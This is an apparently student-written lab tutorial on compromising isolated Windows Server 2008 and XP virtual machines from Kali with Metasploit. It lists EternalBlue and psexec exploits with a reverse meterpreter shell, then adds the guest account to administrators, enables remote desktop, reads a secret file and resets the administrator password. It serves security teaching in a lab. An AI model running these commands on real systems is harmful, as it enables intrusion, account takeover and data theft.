## Summary:
This is a tutorial for recreate a metasploit use in  a windows server 2008 and xp sp1

## Description
With three virtual machines, one with kali, other with windows server 2008, and other with windows xp sp1 connected with a host-only adapter (In a network 10.100.1.0/24). For this exploits it is use metasploit.

## Steps To Reproduce:

1. Download, install and power on the kali,windows server 2008 and windows xp .ova (links below)
	- Kali.- user:root pass:root
	- For all machines use a host-only adapter and for windows server 2008 and xp power off first and second adapter and set the third adapter in host-only
2. For windows server 2008
	1. Connect via meterpreter
		- Open a terminal in kali
		- Use the next commands:
			- msfconsole
			- use exploit/windows/smb/ms17_010 _eternalblue
			- set payload windows/x64/meterpreter/reverse_tcp
			- set rhost ip
				- Eg. set rhost 100.100.1.7
			- set lhost ip
				- Eg. set lhost 100.100.1.4
			-  exploit
			-  getuid    to see witch user is logged
	2. Scall privileges for guest
		- Since we are Nt Authority we dont need to escalate privileges on this session
		- Use the next commands:
			- shell
			- net localgroup administrators guest /add
			- exit
	3. For enable Remote Desktop use
		- run getgui -e
	4. For remote login with user "guest"
		- Open a new terminal and use
		- rdesktop -u guest ip
			- Eg. rdesktop -u guest 100.100.1.7
	5. For read secret.txt
		- In the rdesktop sesion go to C:\Users\Administrator\Documents
		- And open secret.txt
	6. For see others vuln
		- Open a new terminal and use the next commands
			- msfdb init
			- msfconsole
			- db_nmap 100.100.1.7 to see which services are open
			- db_nmap -sV -Pn --script vuln 100.100.1.7
	7. For change administrator password
		- In the terminal where you have the sesion of msf open
		- Use the next commands
			- shell
			- net user administrator password
				- Eg. net user administrator Lala123
2. For windows xp
	1. Connect via meterpreter
		- Open a terminal in kali
		- Use the next commands:
			- msfconsole
			- Use exploit /windows/smb/ms17_010 _psexec
			- set rhost ip
				- Eg. set rhost 100.100.1.9
			- set lhost ip
				- Eg. set lhost 100.100.1.4
			-  exploit
			-  getuid    to see witch user is logged
	2. Scall privileges for guest
		- Since we are Nt Authority we dont need to escalate privileges on this session
		- Use the next commands:
			- shell
			- net localgroup administrators guest /add
			- exit
	3. For enable Remote Desktop use
		- run getgui -e
	4. For remote login with user "guest"
		- Open a new terminal and use
		- rdesktop -u guest ip
			- Eg. rdesktop -u guest 100.100.1.9
	5. For read secret.txt
		- In the rdesktop sesion go to C:\Documents and Settings\Administrator\My Documents
		- And open secret.txt
	6. For see others vuln
		- Open a new terminal and use the next commands
			- msfdb init
			- msfconsole
			- db_nmap 100.100.1.9 to see which services are open
			- db_nmap -sV -Pn --script vuln 100.100.1.9
	7. For change administrator password
		- In the terminal where you have the sesion of msf open
		- Use the next commands
			- shell
			- net user administrator password
				- Eg. net user administrator Lala123


## Supporting Material/References:
[Kali .ova](https://iteso01-my.sharepoint.com/:f:/g/personal/si721750_iteso_mx/EmWoa89IGO1BsbMddO7j43IBluuqGNmTLKVSD4PIap5IPw?e=moBewg)

[Windows server 2008 .ova](https://storage.googleapis.com/isos-iteso-esi-1/isos/WindowsServer2008.ova)

[Windows xp .ova](https://storage.googleapis.com/isos-iteso-esi-1/isos/WinXP.ova)

[Kali](https://www.kali.org/)

[Metasploit](https://www.metasploit.com/)

[Metasploit guide](https://www.offensive-security.com/metasploit-unleashed/)